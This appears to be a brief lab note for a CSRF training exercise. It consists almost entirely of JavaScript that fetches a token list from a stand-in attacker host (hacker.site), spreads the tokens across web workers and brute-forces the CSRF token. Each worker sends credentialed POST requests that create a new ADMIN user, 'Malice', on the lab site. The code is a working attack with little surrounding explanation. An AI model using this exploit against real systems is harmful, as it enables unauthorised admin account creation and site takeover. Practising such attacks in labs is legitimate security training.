
## First Create Workers

```
<script type="text/javascript">
    const numberOfWorkers = 5;
    let workers = [];
    for (let i = 0; i < numberOfWorkers; i++) {
        workers.push(new Worker("5.csrf.labs.js"));
    }
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
            let tokens = xhr.responseText.split('\n');
            let i = 0;
            tokens.forEach(function(token) {
                workers[i].postMessage(token);
                i++;
                if (i >= numberOfWorkers) {
                    i = 0;
                }
            });
        }
    }
    xhr.open('GET', 'http://hacker.site/tokens.txt', true);
    xhr.send();
</script>
```

## Function to sent Post Requests
```
onmessage = function(e) {
    const token = e.data;
    const url="http://5.csrf.labs/add_user.php";
    const params = "name=Malice&surname=Smith&email=malice%40hacker.site&role=ADMIN&CSRFToken="+token+"&submit=";
    let http = new XMLHttpRequest();
    http.withCredentials = 'true';
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.onreadystatechange = function() {
        if (http.readyState > 1) { http.abort(); }
    }
    http.send(params);
}
```
